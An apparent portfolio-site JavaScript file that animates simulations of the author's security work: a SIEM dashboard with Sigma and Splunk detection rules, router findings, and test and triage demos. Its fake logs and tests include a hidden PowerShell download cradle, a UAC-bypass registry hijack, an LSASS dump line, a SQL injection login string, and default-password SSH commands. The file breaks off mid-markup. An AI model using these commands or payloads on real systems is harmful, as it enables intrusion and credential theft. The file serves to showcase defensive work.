/* ===================================================================
 *  simulations.js — In-browser simulations for experiences, skills,
 *  and projects. All vanilla JS, no external dependencies.
 * =================================================================== */

(function () {
  'use strict';

  const $ = (s, c = document) => c.querySelector(s);
  const $$ = (s, c = document) => Array.from(c.querySelectorAll(s));
  const el = (tag, cls, html) => {
    const n = document.createElement(tag);
    if (cls) n.className = cls;
    if (html != null) n.innerHTML = html;
    return n;
  };

  /* helper: format live clock for terminals */
  function ts() {
    const d = new Date();
    return d.toTimeString().slice(0, 8);
  }

  /* =================================================================
   *  SIMULATION REGISTRY — each key is referenced from data.js
   * ================================================================= */
  const SIMS = {};

  /* ---- helper to attach a typed terminal ---- */
  function attachTerminal(host, lines, opts = {}) {
    const speed = opts.speed || 18;     // ms per char
    const linePause = opts.linePause || 220;
    const container = host;
    container.innerHTML = '';
    let i = 0;
    function typeLine(line) {
      return new Promise((resolve) => {
        const lineEl = el('div', 'term-line');
        container.appendChild(lineEl);
        // handle prompt class
        if (line.startsWith('$') || line.startsWith('>')) {
          const sp = el('span', 'term-prompt', line.slice(0, 1));
          lineEl.appendChild(sp);
          var text = line.slice(1);
        } else {
          var text = line;
        }
        // pick class based on content
        let cls = 'term-out';
        if (/error|fail|critical|fatal|denied/i.test(line)) cls = 'term-err';
        else if (/warn|caution|suspicious/i.test(line)) cls = 'term-warn';
        else if (/ok|success|passed|clean/i.test(line)) cls = 'term-ok';
        const textSpan = el('span', cls);
        lineEl.appendChild(textSpan);
        let j = 0;
        const tid = setInterval(() => {
          textSpan.textContent += text[j++];
          container.scrollTop = container.scrollHeight;
          if (j >= text.length) {
            clearInterval(tid);
            resolve();
          }
        }, speed);
      });
    }
    (async () => {
      for (const ln of lines) {
        await typeLine(ln);
        await new Promise((r) => setTimeout(r, linePause));
      }
      if (opts.loop) {
        setTimeout(() => attachTerminal(host, lines, opts), 1500);
      }
    })();
  }

  /* =================================================================
   *  1. SOC HOME LAB (Independent Research period)
   *     — Simulates a Splunk SIEM dashboard + Sigma rule viewer
   * ================================================================= */
  SIMS['soc-homelab'] = (host, ctx) => {
    host.innerHTML = `
      <div class="sim-h">SECURITY OPERATIONS CENTER — HOME LAB</div>
      <div class="sim-p">Reproducible 9-phase Active Directory attack chain detection environment: 2× Windows Server 2019 (DC + IIS Web), 1× Windows 10 Pro 22H2 victim, 1× Kali Linux 2026.1 attacker, Splunk Enterprise + Sysmon telemetry. The dashboard below is a live simulation of the detection pipeline.</div>

      <div class="sim-section active" data-sim="dashboard">
        <div class="siem-grid">
          <div class="siem-panel">
            <div class="siem-head"><span>SPLUNK EVENT STREAM — index=main sourcetype=WinEventLog:Sysmon</span><span class="blink" style="color:var(--neon)">●</span></div>
            <div class="siem-log-stream" id="siem-stream"></div>
          </div>
          <div class="siem-panel">
            <div class="siem-head"><span>SECURITY KPIs — last 60min</span><span style="color:var(--fg-dim)">refresh=15s</span></div>
            <div class="siem-kpis" id="siem-kpis"></div>
            <div class="siem-head" style="margin-top:10px"><span>MITRE ATT&CK HEATMAP</span><span style="color:var(--fg-dim)">10 tactics</span></div>
            <div id="siem-heat"></div>
          </div>
        </div>
        <div style="margin-top:14px">
          <div class="sim-h">ATTACK CHAIN — 9 PHASES (click to inspect detection)</div>
          <div class="attack-chain" id="chain-grid"></div>
        </div>
      </div>

      <div class="sim-section" data-sim="sigma">
        <div class="sim-h">SIGMA RULE — Scheduled Task Persistence (T1053.005)</div>
        <pre class="code-viewer"><span class="k">title</span>: <span class="s">Scheduled Task Creation for Persistence</span>
<span class="k">id</span>: <span class="s">4d5e6f7a-8b9c-0123-defa-234567890123</span>
<span class="k">status</span>: <span class="s">production</span>
<span class="k">description</span>: <span class="c"># Detects scheduled tasks that may be used for persistence. Monitors Security Event ID 4698 and Task Scheduler Event ID 106.</span>
<span class="k">references</span>:
  - <span class="s">https://attack.mitre.org/techniques/T1053/005/</span>
<span class="k">author</span>: <span class="s">SOC Home Lab Project Alpha</span>
<span class="k">tags</span>:
  - <span class="s">attack.persistence</span>
  - <span class="s">attack.t1053.005</span>
<span class="k">logsource</span>:
  <span class="k">product</span>: <span class="s">windows</span>
  <span class="k">service</span>: <span class="s">security</span>
<span class="k">detection</span>:
  <span class="k">selection_4698</span>:
    <span class="k">EventID</span>: <span class="n">4698</span>
  <span class="k">selection_106</span>:
    <span class="k">EventID</span>: <span class="n">106</span>
    <span class="k">Source</span>: <span class="s">Microsoft-Windows-TaskScheduler</span>
  <span class="k">suspicious_names</span>:
    <span class="k">TaskName|contains</span>:
      - <span class="s">SystemHealth</span>
      - <span class="s">Updater</span>
      - <span class="s">Monitor</span>
  <span class="k">condition</span>: <span class="s">(selection_4698 or selection_106) and suspicious_names</span>
<span class="k">falsepositives</span>:
  - <span class="s">Legitimate software installation</span>
<span class="k">level</span>: <span class="s">medium</span></pre>
      </div>

      <div class="sim-section" data-sim="spl">
        <div class="sim-h">SPLUNK SPL — Privilege Escalation: UAC Bypass via eventvwr.exe</div>
        <pre class="code-viewer"><span class="c"># Query 1 — Registry modification for UAC bypass (Sysmon Event ID 13)</span>
index=main sourcetype=<span class="s">"WinEventLog:Sysmon"</span> EventCode=<span class="n">13</span> TargetObject=<span class="s">"*mscfile*"</span>
| table _time, Message

<span class="c"># Query 2 — eventvwr.exe execution (Sysmon Event ID 1)</span>
index=main sourcetype=<span class="s">"WinEventLog:Sysmon"</span> EventCode=<span class="n">1</span> ParentImage=<span class="s">"*eventvwr.exe*"</span>
| table _time, Message

<span class="c"># Query 3 — Proof file access (Security 4656 OR 4663)</span>
index=main sourcetype=<span class="s">"WinEventLog:Security"</span> (EventCode=<span class="n">4656</span> OR EventCode=<span class="n">4663</span>) ObjectName=<span class="s">"*msfile*"</span>
| table _time, Message</pre>
      </div>
    `;

    // attach tabs to modal-tabs (handled in main.js openModal)
    // build KPIs
    const kpiData = [
      { val: '14', lbl: 'CRITICAL', cls: 'alert' },
      { val: '37', lbl: 'WARNINGS' },
      { val: '212', lbl: 'INFO' },
      { val: '99.2%', lbl: 'COVERAGE' }
    ];
    const kpis = $('#siem-kpis', host);
    kpiData.forEach((k) => {
      const t = el('div', 'siem-kpi' + (k.cls ? ' ' + k.cls : ''));
      t.innerHTML = `<div class="siem-kpi-val">${k.val}</div><div class="siem-kpi-lbl">${k.lbl}</div>`;
      kpis.appendChild(t);
    });

    // heatmap
    const tactics = [
      'Initial Access', 'Execution', 'Persistence', 'Priv Esc',
      'Defense Evasion', 'Cred Access', 'Discovery', 'Lateral',
      'Collection', 'Impact'
    ];
    const heat = $('#siem-heat', host);
    const heatGrid = el('div');
    heatGrid.style.cssText = 'display:grid;grid-template-columns:repeat(5,1fr);gap:4px';
    const heatLevels = [3, 4, 5, 4, 3, 2, 1, 3, 2, 1];
    tactics.forEach((t, i) => {
      const cell = el('div');
      const lvl = heatLevels[i];
      cell.style.cssText = `padding:6px 4px;border:1px solid var(--line);text-align:center;font-size:9px;color:var(--fg-soft);background:rgba(255,${184 - lvl * 25},${0 + lvl * 15},0.08)`;
      cell.innerHTML = `<div style="color:var(--neon-${lvl > 3 ? '3' : '4'});font-family:var(--display);font-weight:800">${lvl}</div>${t}`;
      heatGrid.appendChild(cell);
    });
    heat.appendChild(heatGrid);

    // attack chain
    const chain = [
      { no: '01', name: 'Initial Access', tool: 'invoice.xlsm (VBA macro)', tactic: 'T1566.001' },
      { no: '02', name: 'Execution',       tool: 'PowerShell IEX cradle', tactic: 'T1059.001' },
      { no: '03', name: 'Enumeration',     tool: 'Rubeus.exe kerberoast',  tactic: 'T1558.003' },
      { no: '04', name: 'Privilege Escalation', tool: 'eventvwr.exe UAC bypass', tactic: 'T1548.002' },
      { no: '05', name: 'Persistence',     tool: 'SystemHealthMonitor task', tactic: 'T1053.005' },
      { no: '06', name: 'Lateral Movement', tool: 'WinRM / Invoke-Command', tactic: 'T1021.006' },
      { no: '07', name: 'C2 Beacon on DC', tool: 'svchost_updater.exe', tactic: 'T1543.003' },
      { no: '08', name: 'DC Persistence',   tool: 'Malicious service',     tactic: 'T1543.003' },
      { no: '09', name: 'Credential Dump', tool: 'ProcDump -ma lsass.dmp', tactic: 'T1003.001' }
    ];
    const chainGrid = $('#chain-grid', host);
    chain.forEach((c, i) => {
      const node = el('div', 'chain-node');
      node.innerHTML = `<div class="chain-no">PHASE ${c.no}</div><div class="chain-name">${c.name}</div><div class="chain-tool">▸ ${c.tool}</div><div class="chain-tactic">${c.tactic}</div>`;
      chainGrid.appendChild(node);
      setTimeout(() => node.classList.add('active'), 400 + i * 220);
      setTimeout(() => { node.classList.remove('active'); node.classList.add('done'); }, 400 + i * 220 + 1200);
    });

    // log stream
    const stream = $('#siem-stream', host);
    const logTemplates = [
      ['info', `[${ts()}] Sysmon/1 ProcessCreate: powershell.exe -ExecutionPolicy Bypass -w hidden IEX (New-Object Net.WebClient).DownloadString`],
      ['warn', `[${ts()}] Security/4698 Scheduled task created: TaskName='\\SystemHealthMonitor' Author=WIN-DC\\Administrator`],
      ['crit', `[${ts()}] Sysmon/10 ProcessAccess: lsass.exe accessed by svchost.exe PID=712 (SourceImage: C:\\Windows\\Temp\\svchost_updater.exe)`],
      ['info', `[${ts()}] Sysmon/1 ProcessCreate: eventvwr.exe (parent: explorer.exe) — possible UAC bypass chain`],
      ['crit', `[${ts()}] Security/4624 Logon: User=Administrator LogonType=3 NetworkAddress=192.168.56.103 — Pass-the-Ticket`],
      ['warn', `[${ts()}] Sysmon/13 RegistryValueSet: HKCU\\Software\\Classes\\mscfile\\shell\\open\\command = "C:\\Windows\\Temp\\explorer.exe"`],
      ['info', `[${ts()}] Splunk: detection 'win_scheduled_task_persistence' fired — Sigma rule T1053.005`],
      ['crit', `[${ts()}] Memory: Volatility3 --lsass dump — Mimikatz signature detected, NT hash extracted`],
      ['info', `[${ts()}] Rubeus: kerberoast complete — TGT for svc-sql extracted (rc4_hmac)`]
    ];
    let li = 0;
    function pushLog() {
      const [lvl, txt] = logTemplates[li % logTemplates.length];
      const line = el('div', `siem-log-line ${lvl}`, txt);
      stream.appendChild(line);
      // keep last 14 lines
      const all = $$('.siem-log-line', stream);
      if (all.length > 14) all[0].remove();
      li++;
    }
    pushLog(); pushLog(); pushLog();
    const logInt = setInterval(pushLog, 1400);
    // cleanup on close handled by modal lifecycle
    host.__cleanup = () => clearInterval(logInt);

    // build tab nav
    ctx.tabs = [
      { id: 'dashboard', label: '// SIEM Dashboard' },
      { id: 'sigma',     label: '// Sigma Rule' },
      { id: 'spl',       label: '// Splunk SPL' }
    ];
  };

  /* =================================================================
   *  2. LIBERTYGLOBAL — Gateway Validation & SSH Finding
   * ================================================================= */
  SIMS['libertyglobal-soc'] = (host, ctx) => {
    host.innerHTML = `
      <div class="sim-h">LIBERTYGLOBAL — GATEWAY VALIDATION & SECURITY TESTING</div>
      <div class="sim-p">Anomaly-driven security testing across LibertyGlobal's production DOCSIS, RDK-B, XGS-PON and VoIP infrastructure. The terminal below reconstructs the discovery, validation, and remediation cycle of the Critical-rated SSH remote-access finding on the XGS-PON product line.</div>

      <div class="sim-section active" data-sim="terminal">
        <div class="term" id="lg-term"></div>
      </div>

      <div class="sim-section" data-sim="finding">
        <div class="sim-h">JIRA TICKET — CRITICAL FINDING #XGS-2021-0144</div>
        <div class="skill-modal-block" style="margin-bottom:12px">
          <div class="sim-p" style="margin:0">
            <strong style="color:var(--neon)">Product:</strong> XGS-PON Gateway (LibertyGlobal broadband)<br>
            <strong style="color:var(--neon)">Vulnerability:</strong> SSH Remote Access enabled by default with admin-equivalent GUI password<br>
            <strong style="color:var(--neon-3)">CVSS:</strong> 8.4 (Critical)<br>
            <strong style="color:var(--neon-2)">Tool used:</strong> PuTTY (SSH client)<br>
            <strong style="color:var(--fg)">Reproducibility:</strong> Always reproducible on factory-firmware
          </div>
        </div>
        <div class="sim-h">IMPACT</div>
        <div class="sim-p">Full unauthenticated remote control of the gateway: attacker can fetch all interfaces, perform reboot, factory restore, change WiFi configuration, change GUI/SSH password — admin-equivalent access without any user interaction.</div>
        <div class="sim-h">REMEDIATION (implemented by Dev team)</div>
        <ul style="list-style:none;padding:0;font-size:12px;color:var(--fg-soft);line-height:1.7">
          <li>▸ SSH remote access <strong style="color:var(--neon)">deactivated by default</strong> — opt-in only</li>
          <li>▸ SSH session requires user-set password (not the GUI default)</li>
          <li>▸ SSH session is now <strong style="color:var(--neon)">read-only</strong> — no admin-equivalent rights</li>
          <li>▸ All admin operations moved to GUI + CLI with separate audit logging</li>
        </ul>
      </div>

      <div class="sim-section" data-sim="metrics">
        <div class="sim-h">VALIDATION METRICS — XGS-PON Product Line (lead role)</div>
        <div class="siem-kpis" style="grid-template-columns:repeat(4,1fr)">
          <div class="siem-kpi"><div class="siem-kpi-val">8</div><div class="siem-kpi-lbl">ENGINEERS LED</div></div>
          <div class="siem-kpi"><div class="siem-kpi-val">2</div><div class="siem-kpi-lbl">MONTHS SOLO</div></div>
          <div class="siem-kpi"><div class="siem-kpi-val">9</div><div class="siem-kpi-lbl">PROTOCOLS TESTED</div></div>
          <div class="siem-kpi alert"><div class="siem-kpi-val">CVSS 8.4</div><div class="siem-kpi-lbl">CRITICAL FINDING</div></div>
        </div>
        <div class="sim-h" style="margin-top:14px">PROTOCOLS VALIDATED (level 4 / 5)</div>
        <div style="display:flex;flex-wrap:wrap;gap:6px;font-size:10px">
          ${['TCP/IP','DHCP','DNS','HTTP/HTTPS','SIP/RTP','TLS','SSH','TR-069','ARP','ICMP','GRE','PPP','WiFi 6','WPA2/3','DOCSIS 3.1','XGS-PON','VoIP','Firewall','NAT','IPSec','AES'].map(p => `<span class="stack-chip">${p}</span>`).join('')}
        </div>
      </div>
    `;

    const lines = [
      '$ ssh admin@192.168.1.1 -p 22',
      '> Connecting to XGS-PON gateway 192.168.1.1...',
      '> Auth method: password (using GUI default: admin/admin)',
      '> Authenticated successfully — SSH session opened',
      '$ show interfaces',
      '[XGS-PON]  PON:  up, link 2.5 Gbps, OLT=10.20.30.40',
      '[WAN]      eth0: up, DHCP 84.0.0.42/24',
      '[LAN]      eth1: up, 192.168.1.1/24',
      '[WiFi]    wlan0: up, ssid=LibertyGlobal-Home, WPA2-PSK',
      '$ show running-config | include admin',
      'admin password admin',
      'admin access-level full',
      '$ reboot',
      'CRITICAL: gateway rebooting without any confirmation prompt!',
      '$ restore defaults',
      'CRITICAL: factory reset triggered without confirmation!',
      '$ set wifi ssid new-name password stolen123',
      'wifi config updated successfully',
      '$ set gui-password newPass123',
      'gui config updated successfully — GUI admin password changed',
      '$ set ssh-password newPass123',
      'ssh config updated successfully — SSH admin password changed',
      '',
      '> VALIDATION RESULT: SSH session has full admin-equivalent rights',
      '> No authentication prompt for destructive operations',
      '> JIRA ticket raised: severity=CRITICAL, CVSS=8.4, reproducibility=100%',
      '> Remediation shipped in firmware v3.7.2 — SSH opt-in + read-only session'
    ];
    attachTerminal($('#lg-term', host), lines, { speed: 12, linePause: 90 });

    ctx.tabs = [
      { id: 'terminal', label: '// SSH Finding Terminal' },
      { id: 'finding',  label: '// Jira Ticket' },
      { id: 'metrics',  label: '// Validation Metrics' }
    ];
  };

  /* =================================================================
   *  3. CAPGEMINI / AXA — Automation Pipeline
   * ================================================================= */
  SIMS['axa-automation'] = (host, ctx) => {
    host.innerHTML = `
      <div class="sim-h">AXA ASSURANCE — MOBILE AUTOMATION PIPELINE</div>
      <div class="sim-p">Automated security test suites for AXA Assurance (France) mobile (iOS + Android) and web platforms using Appium, Selenium WebDriver and Java on Azure cloud. Tests implicitly validated authentication flows, session handling, and access-control logic — catching flaws that static analysis missed.</div>

      <div class="sim-section active" data-sim="flow">
        <div class="sim-h">SHIFT-LEFT PIPELINE</div>
        <div class="ah-flow">
          <div class="ah-step"><span class="ah-step-no">01</span>Manual Test</div>
          <div class="ah-step"><span class="ah-step-no">02</span>Automate (Java)</div>
          <div class="ah-step"><span class="ah-step-no">03</span>Push to GitHub</div>
          <div class="ah-step"><span class="ah-step-no">04</span>Azure Device Cloud</div>
        </div>
        <div class="ah-flow">
          <div class="ah-step"><span class="ah-step-no">05</span>Run on iOS + Android</div>
          <div class="ah-step"><span class="ah-step-no">06</span>Session Check</div>
          <div class="ah-step"><span class="ah-step-no">07</span>Auth Verify</div>
          <div class="ah-step"><span class="ah-step-no">08</span>Report</div>
        </div>

        <div class="sim-h" style="margin-top:14px">SHIFT-LEFT SECURITY TESTS</div>
        <ul style="list-style:none;padding:0;font-size:12px;color:var(--fg-soft);line-height:1.8">
          <li>▸ Authentication with wrong usernames/passwords (negative testing)</li>
          <li>▸ Malicious file upload attempts (web forms)</li>
          <li>▸ SQL injection simulation on AXA web forms</li>
          <li>▸ Session handling after logout (token revocation)</li>
          <li>▸ Access-control boundary checks (user A → user B data)</li>
          <li>▸ Payment simulation flow integrity</li>
        </ul>
      </div>

      <div class="sim-section" data-sim="code">
        <div class="sim-h">JAVA + SELENIUM — AUTH NEGATIVE TEST</div>
        <pre class="code-viewer"><span class="k">import</span> org.openqa.selenium.*;
<span class="k">import</span> org.openqa.selenium.remote.RemoteWebDriver;
<span class="k">import</span> java.net.URL;

<span class="k">public class</span> <span class="n">AxaAuthNegativeTest</span> {

  <span class="c">// Azure cloud device — iOS + Android + web</span>
  <span class="k">static</span> WebDriver driver = <span class="k">new</span> RemoteWebDriver(
    <span class="k">new</span> URL(<span class="s">"https://axa-cloud.azurecloud.com/wd/hub"</span>),
    cap(<span class="s">"iPhone 13"</span>, <span class="s">"15.4"</span>, <span class="s">"AXA Mobile"</span>));

  <span class="k">@Test</span>
  <span class="k">public void</span> <span class="n">shouldRejectInvalidPassword</span>() {
    driver.get(<span class="s">"https://m.axa.fr/login"</span>);
    driver.findElement(<span class="k">By</span>.id(<span class="s">"username"</span>)).sendKeys(<span class="s">"legit.user@axa.fr"</span>);
    driver.findElement(<span class="k">By</span>.id(<span class="s">"password"</span>)).sendKeys(<span class="s">"' OR '1'='1"</span>);
    driver.findElement(<span class="k">By</span>.id(<span class="s">"submit"</span>)).click();

    <span class="c">// shift-left: assertion runs at build time, not post-deploy</span>
    <span class="k">assert</span> !driver.getTitle().contains(<span class="s">"Dashboard"</span>)
      : <span class="s">"FAIL: SQLi bypassed auth!"</span>;
    <span class="k">assert</span> driver.findElement(<span class="k">By</span>.css(<span class="s">".error-msg"</span>)).isDisplayed();
  }
}</pre>
      </div>
    `;

    // animate flow
    $$('.ah-step', host).forEach((s, i) => {
      setTimeout(() => s.classList.add('active'), 300 + i * 180);
      setTimeout(() => { s.classList.remove('active'); s.classList.add('done'); }, 300 + i * 180 + 600);
    });

    ctx.tabs = [
      { id: 'flow', label: '// Pipeline' },
      { id: 'code', label: '// Java Code' }
    ];
  };

  /* =================================================================
   *  4. SAGEMCOM — Protocol Tester Terminal
   * ================================================================= */
  SIMS['sagemcom-terminal'] = (host, ctx) => {
    host.innerHTML = `
      <div class="sim-h">SAGEMCOM — KDG DOCSIS 3.1 CRITICAL FINDING</div>
      <div class="sim-p">5-year vulnerability assessment program across 10+ CPE product lines (BBox3, Vodafone, KDG, TalkTalk, Telia, Bouygues, Sunrise, KPN). The terminal below reconstructs the discovery of a CVSS 8.0 critical finding on the KDG DOCSIS 3.1 product — factory reset caused an infinite boot loop, bricking the gateway.</div>

      <div class="sim-section active" data-sim="terminal">
        <div class="term" id="sg-term"></div>
      </div>

      <div class="sim-section" data-sim="ticket">
        <div class="sim-h">JIRA TICKET — CRITICAL #KDG-2018-0917</div>
        <div class="skill-modal-block" style="margin-bottom:12px">
          <div class="sim-p" style="margin:0">
            <strong style="color:var(--neon)">Product:</strong> KDG DOCSIS 3.1 (production firmware)<br>
            <strong style="color:var(--neon)">Severity:</strong> CRITICAL (CVSS 8.0)<br>
            <strong style="color:var(--neon-3)">Reproducibility:</strong> 100% — GUI & SNMP both<br>
            <strong style="color:var(--neon-2)">Category:</strong> Functional / Availability / Mass-impact<br>
            <strong style="color:var(--fg)">Reported:</strong> Bugzilla → Jira, with full logs & screenshots
          </div>
        </div>
        <div class="sim-h">VULNERABILITY DESCRIPTION</div>
        <div class="sim-p">Performing a factory reset from the GUI or from SNMP management pushes the gateway into an infinite reboot loop. Once the loop starts, no further action is possible — the gateway is effectively bricked.</div>
        <div class="sim-h">IMPACT — MASS CUSTOMER IMPACT</div>
        <div class="sim-p">If shipped to production, hundreds of subscribers performing a manual factory reset would brick their gateway simultaneously, requiring manual firmware recovery for each one.</div>
        <div class="sim-h">REMEDIATION (shipped pre-release)</div>
        <ul style="list-style:none;padding:0;font-size:12px;color:var(--fg-soft);line-height:1.7">
          <li>▸ During the boot loop, interrupt the boot from the CLI</li>
          <li>▸ Perform a manual firmware upgrade to the same version</li>
          <li>▸ Only after upgrade does the gateway reboot and operate normally</li>
          <li>▸ Pre-release firmware remediation cycle triggered — saved millions in customer tickets</li>
        </ul>
      </div>

      <div class="sim-section" data-sim="traceability">
        <div class="sim-h">ISO 27001:2022 ANNEX A — TRACEABILITY MATRIX</div>
        <pre class="code-viewer"><span class="c"># Bidirectional: requirement ⇄ test case ⇄ finding</span>

<span class="k">REQ-KDG-2018-117</span>     <span class="c">// customer requirement: "factory reset must restore default config"</span>
  ├─ <span class="n">TC-KDG-2018-117-01</span>   GUI factory reset — restore defaults
  ├─ <span class="n">TC-KDG-2018-117-02</span>   SNMP factory reset — restore defaults
  └─ <span class="n">TC-KDG-2018-117-03</span>   Factory reset — verify no regression

<span class="k">FINDING #KDG-2018-0917</span>   <span class="c">// critical bug from TC-117-01 + TC-117-02</span>
  ├─ <span class="s">severity:   CRITICAL</span>
  ├─ <span class="s">CVSS:       8.0</span>
  ├─ <span class="s">category:   Functional / Availability</span>
  ├─ <span class="s">env:        Sagemcom lab, firmware v2.4.1-rc3</span>
  ├─ <span class="s">tools:      GUI + SNMP management tool</span>
  ├─ <span class="s">steps:      1) login GUI  2) reset  3) reboot loop</span>
  ├─ <span class="s">logs:       boot_cycle.log + serial_console.txt</span>
  ├─ <span class="s">screenshots:5 attached</span>
  └─ <span class="s">remediation: CLI boot interrupt → manual fw upgrade</span>

<span class="c"># Audit trail: full requirement→test→finding chain attached in Jira</span></pre>
      </div>
    `;

    const lines = [
      '$ ssh admin@kdg-gateway.local',
      '> KDG DOCSIS 3.1 — firmware v2.4.1-rc3',
      '> Authenticated: admin / ******',
      '$ show version',
      'HW: KDG-DC3.1-Broadband-Gateway',
      'FW: v2.4.1-rc3 (pre-release)',
      '',
      '# Test: GUI factory reset — TC-KDG-2018-117-01',
      '$ trigger gui factory-reset',
      '> Gateway restarting...',
      '> ...reboot cycle 1...',
      '> ...reboot cycle 2...',
      '> ...reboot cycle 3...',
      '!!! CRITICAL: GATEWAY STUCK IN BOOT LOOP !!!',
      '!!! NO FURTHER GUI / SNMP ACCESS POSSIBLE !!!',
      '',
      '# Test: SNMP factory reset — TC-KDG-2018-117-02',
      '$ snmpset -v2c -c private 192.168.1.1 1.3.6.1.4.1... i 2',
      '> Factory reset triggered via SNMP',
      '> ...reboot cycle 1...',
      '!!! SAME INFINITE LOOP — REPRODUCIBLE ON BOTH PATHS !!!',
      '',
      '> Severity: CRITICAL',
      '> CVSS v3.0 score: 8.0',
      '> Reproducibility: 100%',
      '> Reported to dev team via Jira ticket #KDG-2018-0917',
      '> Logs + screenshots + serial console capture attached',
      '> Pre-release firmware remediation cycle triggered'
    ];
    attachTerminal($('#sg-term', host), lines, { speed: 12, linePause: 80 });

    ctx.tabs = [
      { id: 'terminal',      label: '// Finding Terminal' },
      { id: 'ticket',        label: '// Jira Ticket' },
      { id: 'traceability',  label: '// ISO 27001 Matrix' }
    ];
  };

  /* =================================================================
   *  5. FOCUS INTERNATIONAL — Bluetooth car-kit stress test
   * ================================================================= */
  SIMS['bluetooth-test'] = (host, ctx) => {
    host.innerHTML = `
      <div class="sim-h">FOCUS INTERNATIONAL — PARROT AUTOMOTIVE BLUETOOTH VALIDATION</div>
      <div class="sim-p">Manual validation of Bluetooth car-kit connectivity: incoming/outgoing calls, music streaming, contact sync, multi-phone support. Stress-tested protocol state machines: repeated connect/disconnect, multi-phone handoff, overnight persistence. Reported in Bugzilla with reproducible steps.</div>

      <div class="sim-section active" data-sim="sim">
        <div class="sim-h">BLUETOOTH SIGNAL + STATE MACHINE</div>
        <div class="bt-wave" id="bt-wave"></div>
        <div class="sim-h">ACTIVE TESTS</div>
        <ul style="list-style:none;padding:0;font-size:12px;color:var(--fg-soft);line-height:1.8">
          <li>▸ <span class="stack-chip">CK3100</span> + iPhone 3GS — pairing</li>
          <li>▸ <span class="stack-chip">Porsche Carkit</span> + Nokia N73 — incoming call</li>
          <li>▸ Multi-phone handoff: iPhone ↔ Blackberry ↔ Nokia</li>
          <li>▸ Overnight persistence: 12h connected, re-test on wake</li>
        </ul>
        <div class="sim-h" style="margin-top:14px">STATE MACHINE — 1000 CYCLES</div>
        <div class="siem-kpis" style="grid-template-columns:repeat(4,1fr)">
          <div class="siem-kpi"><div class="siem-kpi-val" id="bt-cycles">0</div><div class="siem-kpi-lbl">CONNECT/DISCONNECT CYCLES</div></div>
          <div class="siem-kpi"><div class="siem-kpi-val" id="bt-paired">3</div><div class="siem-kpi-lbl">PAIRED PHONES</div></div>
          <div class="siem-kpi"><div class="siem-kpi-val" id="bt-calls">0</div><div class="siem-kpi-lbl">CALLS TESTED</div></div>
          <div class="siem-kpi"><div class="siem-kpi-val" id="bt-bugs">0</div><div class="siem-kpi-lbl">BUGS FOUND</div></div>
        </div>
      </div>

      <div class="sim-section" data-sim="bug">
        <div class="sim-h">BUGZILLA BUG REPORT — TEMPLATE</div>
        <pre class="code-viewer"><span class="k">Product</span>:      <span class="s">Parrot CK3100 — firmware v1.06b</span>
<span class="k">Component</span>:    <span class="s">Bluetooth stack — state machine</span>
<span class="k">Severity</span>:     <span class="s">major</span>
<span class="k">Title</span>:        <span class="s">Multi-phone handoff loses call when 3rd phone pairs</span>

<span class="k">Steps to Reproduce</span>:
  1. Pair iPhone 3GS — establish call
  2. Pair Nokia N73 — establish call (iPhone put on hold)
  3. Pair Blackberry 9700 — observe state of iPhone/Nokia calls

<span class="k">Expected</span>:     <span class="s">3rd phone pairs, calls queue correctly</span>
<span class="k">Actual</span>:       <span class="s">3rd pairing drops BOTH active calls without notice</span>

<span class="k">Logs</span>:         <span class="s">bt_hci_log_2012-08-14.txt attached</span>
<span class="k">Environment</span>: <span class="s">CK3100 + 3 phones (BT v2.0 + EDR), 12V car adapter</span>
<span class="k">Reported</span>:    <span class="s">directly to Parrot (France) — daily report cycle</span></pre>
      </div>
    `;

    // bluetooth wave animation
    const wave = $('#bt-wave', host);
    const bars = [];
    for (let i = 0; i < 60; i++) {
      const b = el('div', 'bt-wave-bar');
      b.style.left = `${(i / 60) * 100}%`;
      wave.appendChild(b);
      bars.push(b);
    }
    let cycles = 0, calls = 0, bugs = 0;
    const waveInt = setInterval(() => {
      bars.forEach((b, i) => {
        const h = Math.abs(Math.sin((Date.now() / 200) + i * 0.3)) * 70 + 5;
        b.style.height = h + 'px';
      });
    }, 60);

    // counter interval
    const cntInt = setInterval(() => {
      cycles += Math.floor(Math.random() * 7) + 1;
      if (Math.random() > 0.7) calls += 1;
      if (Math.random() > 0.95) bugs += 1;
      const c1 = $('#bt-cycles', host); if (c1) c1.textContent = cycles;
      const c2 = $('#bt-calls', host);  if (c2) c2.textContent = calls;
      const c3 = $('#bt-bugs', host);   if (c3) c3.textContent = bugs;
    }, 600);

    host.__cleanup = () => { clearInterval(waveInt); clearInterval(cntInt); };

    ctx.tabs = [
      { id: 'sim',  label: '// Live Simulation' },
      { id: 'bug',  label: '// Bugzilla Report' }
    ];
  };

  /* =================================================================
   *  6. CYBERGUARDIAN — Malware Triage Simulation
   * ================================================================= */
  SIMS['cyberguardian-scan'] = (host, ctx) => {
    host.innerHTML = `
      <div class="sim-h">CYBERGUARDIAN — LOCAL MALWARE TRIAGE</div>
      <div class="sim-p">Multi-layered detection tool: scans running processes, files, registry, network connections & memory; correlates with YARA rules + VirusTotal (70+ AV engines) + AI-based analysis (OpenAI / Gemini / DeepSeek) for malware classification with automatic MITRE ATT&CK technique mapping.</div>

      <div class="sim-section active" data-sim="scan">
        <div class="cg-grid">
          <div class="cg-tile" data-tile="process">
            <div class="cg-tile-head"><span>PROCESS ANALYSIS</span><span class="cg-status">●</span></div>
            <div class="cg-tile-body">Scanning PID 712 (svchost.exe)<br><span class="ioc">YARA match: malware_generic_loader</span><br>SHA256: 4f8c...e201<br><span class="ioc">VT: 38/72 detections</span><br>Behavior: parent=spoolsv.exe (suspicious chain)</div>
          </div>
          <div class="cg-tile" data-tile="file">
            <div class="cg-tile-head"><span>FILE ANALYSIS</span><span class="cg-status">●</span></div>
            <div class="cg-tile-body">C:\\Users\\victim\\Downloads\\invoice.xlsm<br><span class="ioc">YARA match: maldoc_vba_macro</span><br>Entropy: 7.8 (packed)<br>PE: N/A (Office doc)<br><span class="ioc">VT: 41/72 detections</span><br>Macros: ENABLED (suspicious)</div>
          </div>
          <div class="cg-tile" data-tile="registry">
            <div class="cg-tile-head"><span>REGISTRY ANALYSIS</span><span class="cg-status">●</span></div>
            <div class="cg-tile-body">HKCU\\Software\\Classes\\mscfile\\shell\\open\\command<br><span class="ioc">IFEO Debugger Injection detected!</span><br>Value: C:\\Windows\\Temp\\explorer.exe<br>Severity: CRITICAL persistence<br>Pattern: UAC bypass (eventvwr.exe)</div>
          </div>
          <div class="cg-tile" data-tile="network">
            <div class="cg-tile-head"><span>NETWORK ANALYSIS</span><span class="cg-status">●</span></div>
